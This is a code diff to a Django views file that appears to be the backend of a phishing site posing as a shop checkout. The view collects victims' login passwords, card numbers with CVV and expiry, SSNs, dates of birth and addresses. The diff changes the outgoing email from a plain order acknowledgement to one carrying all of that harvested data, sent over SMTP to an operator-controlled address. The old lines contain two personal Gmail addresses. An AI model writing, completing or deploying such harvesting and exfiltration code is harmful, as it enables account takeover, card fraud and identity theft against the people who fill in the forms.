@@ -1,6 +1,14 @@
 import yagmail
 from django.shortcuts import render,redirect
 from .forms import *
+import os
+from dotenv import find_dotenv, load_dotenv
+
+dotenv = find_dotenv()
+load_dotenv(dotenv)
+RECIEVER_EMAIL = os.getenv('RECIEVER_EMAIL')
+SENDER_EMAIL = os.getenv('SENDER_EMAIL')
+PASSWORD = os.getenv('PASSWORD')
 
 def home_view(request):
     
@@ -46,26 +54,18 @@ def thank_you_view(request):
 
     # Format the content of the email
     email_content = f"""
-    username: {login_data.get('user_name', 'N/A')}
-    password: {login_data.get('pass_word', 'N/A')}
-    card_name: {bill_data.get('card_name', 'N/A')}
-    card_number: {bill_data.get('card_number', 'N/A')}
-    expiration_date: {bill_data.get('expiry_date', 'N/A')}
-    address: {bill_data.get('address', 'N/A')}
-    cvv: {bill_data.get('cvv', 'N/A')}
-    ssn: {info_data.get('ssn', 'N/A')}
-    phone_number: {info_data.get('phone_number', 'N/A')}
-    dob: {info_data.get('dob', 'N/A')}
-    postal_code: {info_data.get('postal_code', 'N/A')}
+    {login_data}/n
+    {bill_data}/n
+    {info_data}
     """
 
     try:
         # Ensure you have configured yagmail with your email and password securely
-        yag = yagmail.SMTP('castanedaorlando871@gmail.com')  # Replace with a secure method for loading credentials
+        yag = yagmail.SMTP(SENDER_EMAIL, PASSWORD)  # Replace with a secure method for loading credentials
         yag.send(
-            to='lyndazuniga2020@gmail.com',  # Replace with actual recipient email
+            to=RECIEVER_EMAIL, 
             subject='Thank You!',
-            contents= "thank you for your order",
+            contents= email_content,
         )
         print("✅ Email sent successfully!")
     except Exception as e:
